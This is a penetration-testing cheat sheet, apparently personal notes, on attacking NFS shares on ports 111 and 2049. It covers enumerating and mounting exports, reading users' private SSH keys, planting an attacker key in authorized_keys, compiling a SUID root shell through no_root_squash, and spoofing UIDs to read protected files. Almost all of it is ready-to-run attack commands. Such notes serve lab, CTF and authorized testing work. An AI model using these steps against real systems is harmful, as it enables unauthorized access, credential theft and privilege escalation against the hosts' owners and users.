# NFS (Port 111/2049)

Network File System. If you see rpcbind (111) or nfs (2049), always check for exported shares. These often have misconfigured permissions and can give you sensitive files or even a foothold.

## Nmap Scripts

```bash
nmap -sV -sC -p 111,2049 <target ip>
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111 <target ip>
```

## Enumeration

```bash
# list exported shares
showmount -e <target ip>

# rpcinfo
rpcinfo -p <target ip>
```

## Mounting Shares

```bash
# create a mount point
mkdir /tmp/nfs

# mount the share
sudo mount -t nfs <target ip>:/<share path> /tmp/nfs -o nolock

# if NFSv3
sudo mount -t nfs -o vers=3 <target ip>:/<share path> /tmp/nfs

# browse the files
ls -la /tmp/nfs

# unmount when done
sudo umount /tmp/nfs
```

## Exploitation

If the NFS share contains a user's home directory:

```bash
# check for SSH keys
cat /tmp/nfs/.ssh/id_rsa

# if the share is writable and you can see a user's .ssh folder
# create your own SSH key and add it
ssh-keygen -t rsa -b 4096 -f mykey
cp mykey.pub /tmp/nfs/.ssh/authorized_keys
ssh -i mykey user@<target ip>
```

If the share has no_root_squash enabled (check /etc/exports on the target), you can create SUID binaries:

```bash
# compile a SUID shell
echo 'int main(){setuid(0);system("/bin/bash");return 0;}' > /tmp/shell.c
gcc /tmp/shell.c -o /tmp/nfs/shell
sudo chmod u+s /tmp/nfs/shell
# then execute ./shell on the target as the low-priv user
```

## UID Spoofing

NFS uses UID for access control. If a file is owned by uid 1001, create a local user with that uid:

```bash
sudo useradd -u 1001 fakeuser
sudo su fakeuser
cat /tmp/nfs/secret_file
```
